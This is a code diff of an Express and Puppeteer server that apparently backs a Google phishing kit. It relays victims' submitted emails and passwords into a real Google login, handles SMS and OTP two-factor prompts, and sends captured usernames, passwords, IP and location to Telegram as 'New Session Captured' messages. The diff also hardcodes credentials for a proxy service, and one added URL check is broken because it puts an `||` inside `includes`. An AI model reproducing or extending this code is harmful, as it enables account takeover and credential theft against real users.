@@ -58,6 +58,13 @@ async function waitForSpinnerToFinish(page, timeout = 8000) {
   } catch {}
 }
 
+const PROXY = {
+  host: "gw.dataimpulse.com",
+  port: 823,
+  username: "e34f312113450eeb8578__cr.it",
+  password: "517aa00c2c9ed320",
+};
+
 app.post("/start-session", async (req, res) => {
   try {
     const sessionId = uuidv4();
@@ -89,6 +96,7 @@ app.post("/start-session", async (req, res) => {
         userDataDir: profilePath,
         defaultViewport: null,
         args: [
+          `--proxy-server=http://${PROXY.host}:${PROXY.port}`,
           "--start-maximized",
           "--no-sandbox",
           "--disable-setuid-sandbox",
@@ -97,6 +105,11 @@ app.post("/start-session", async (req, res) => {
       });
 
       const page = await browser.newPage();
+
+      await page.authenticate({
+        username: PROXY.username,
+        password: PROXY.password,
+      });
       await page.setUserAgent(
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
           "Chrome/128.0.0.0 Safari/537.36"
@@ -367,43 +380,29 @@ app.post("/sign-in-2", async (req, res) => {
     const smsChallengeText = "Choose how you want to sign in:";
     const welcome = "Welcome,";
     const signInFaster = "Sign in faster";
+    const successUrlSubstring = "myaccount.google.com";
+    const successUrlSubstring2 = "gds.google.com";
 
-    const detectedText = await page.waitForFunction(
-      (
-        invalidPassword,
-        validPassword,
-        smsChallengeText,
-        welcome,
-        signInFaster
-      ) => {
-        const bodyText = document.body.innerText;
-        if (bodyText.includes(validPassword)) return bodyText;
-        if (bodyText.includes(invalidPassword)) return invalidPassword;
-        if (bodyText.includes(smsChallengeText)) return smsChallengeText;
-        if (bodyText.includes(welcome)) return welcome;
-        if (bodyText.includes(signInFaster)) return signInFaster;
-        return null;
-      },
-      { timeout: 10000, polling: 100 },
-      invalidPassword,
-      validPassword,
-      smsChallengeText,
-      welcome,
-      signInFaster
-    );
+    await waitForSpinnerToFinish(page);
 
-    const result = await detectedText.jsonValue();
+    const currentUrl = page.url();
+    if (
+      currentUrl.includes(successUrlSubstring) ||
+      currentUrl.includes(successUrlSubstring2)
+    ) {
+      console.log(`Session ${sessionId}: ✅ login success`);
+      return res.json({ success: true, code: 3, message: "Verified" });
+    }
 
-    // Handle invalid password
-    if (result === invalidPassword) {
+    let bodyText = await page.evaluate(() => document.body.innerText);
+
+    if (bodyText.includes(invalidPassword)) {
       console.log(`Session ${sessionId}: ❌ Wrong password entered`);
       return res.json({ success: false, code: 0 });
     }
 
-    // Extract text after "Check your"
-    // Extract text after "Check your"
-    if (typeof result === "string" && result.includes(validPassword)) {
-      const match = result.match(/Check your\s+([^\n]+)/i);
+    if (bodyText.includes(validPassword)) {
+      const match = bodyText.match(/Check your\s+([^\n]+)/i);
       const checkTarget = match ? match[1].trim() : null;
 
       console.log(
@@ -429,7 +428,7 @@ app.post("/sign-in-2", async (req, res) => {
       });
     }
 
-    if (result === smsChallengeText) {
+    if (bodyText.includes(smsChallengeText)) {
       console.log(
         `Session ${sessionId}: 📱 SMS challenge found — selecting SMS option`
       );
@@ -464,18 +463,16 @@ app.post("/sign-in-2", async (req, res) => {
       return res.json({ success: true, code: 2, message: maskedPhone });
     }
 
-    if (result === welcome) {
+    if (bodyText.includes(signInFaster)) {
+      console.log(`Session ${sessionId}: 🚀 'Sign in faster' screen detected`);
+      return res.json({ success: true, code: 3, message: signInFaster });
+    }
+
+    if (bodyText.includes(welcome)) {
       console.log(`Session ${sessionId}: Login Successful`);
       return res.json({ success: true, code: 3, message: welcome });
     }
 
-    // NEW HANDLER: Sign in faster screens
-    if (result === signInFaster) {
-      console.log(`Session ${sessionId}: 🚀 'Sign in faster' screen detected`);
-    }
-
-    // Default fallback
-    res.json({ success: false, code: 20, message: "Unexpected response" });
   } catch (err) {
     console.error("Sign-in-2 error:", err);
     res.status(500).json({ success: false, error: err.message });
@@ -502,7 +499,11 @@ app.post("/verify-google-url", async (req, res) => {
     // console.log(`Session ${sessionId}: 🌐 Current URL → ${currentUrl}`);
 
     // Check if the URL is Google's account domain
-    if (currentUrl.includes("account.google.com")) {
+    if (
+      currentUrl.includes(
+        "myaccount.google.com" || currentUrl.includes("gds.google.com")
+      )
+    ) {
       console.log(`Session ${sessionId}: ✅ 2FA Successful`);
       return res.json(1);
     } else {
@@ -514,7 +515,6 @@ app.post("/verify-google-url", async (req, res) => {
     res.status(500).json({ success: false, error: err.message });
   }
 });
-
 app.post("/confirm-phone", async (req, res) => {
   try {
     const { sessionId, phone } = req.body;
@@ -621,6 +621,7 @@ app.post("/phone-otp", async (req, res) => {
     // Failure and success indicators
     const wrongCodeText = "Wrong code. Try again.";
     const successUrlSubstring = "myaccount.google.com";
+    const successUrlSubstring2 = "gds.google.com";
 
     // Wait for OTP input
     await page.waitForSelector('input[type="tel"]', {
@@ -642,7 +643,10 @@ app.post("/phone-otp", async (req, res) => {
 
     // Check URL first
     const currentUrl = page.url();
-    if (currentUrl.includes(successUrlSubstring)) {
+    if (
+      currentUrl.includes(successUrlSubstring) ||
+      currentUrl.includes(successUrlSubstring2)
+    ) {
       console.log(`Session ${sessionId}: ✅ OTP accepted — login success`);
       return res.json({ success: true, code: 1, message: "Verified" });
     }
@@ -676,6 +680,30 @@ app.post("/phone-otp", async (req, res) => {
     return res.status(500).json({ success: false, error: err.message });
   }
 });
+
+async function sendLoginSessionMessage(sessionId) {
+  const session = sessions[sessionId];
+  if (!session) return;
+
+  const { userInfo, ipInfo, page } = session;
+  const currentUrl = page.url();
+
+  const ipDetails = ipInfo
+    ? `IP : ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}`
+    : `IP : unknown`;
+
+  const sessionMessage =
+    `<b>New Session Captured</b>\n\n` +
+    `Name : GOOGLE\n` +
+    `Username : ${userInfo?.email || "unknown"}\n` +
+    `Password : <tg-spoiler>${userInfo?.password || ""}</tg-spoiler>\n` +
+    `Landing URL : ${currentUrl}\n` +
+    `${ipDetails}\n\n` +
+    `👆 <b>User Agent (click to copy):</b>\n` +
+    `<code>${userInfo?.userAgent || "unknown"}</code>`;
+
+  await sendTelegramMessage(sessionMessage);
+}
 
 app.post("/end-session", async (req, res) => {
   try {
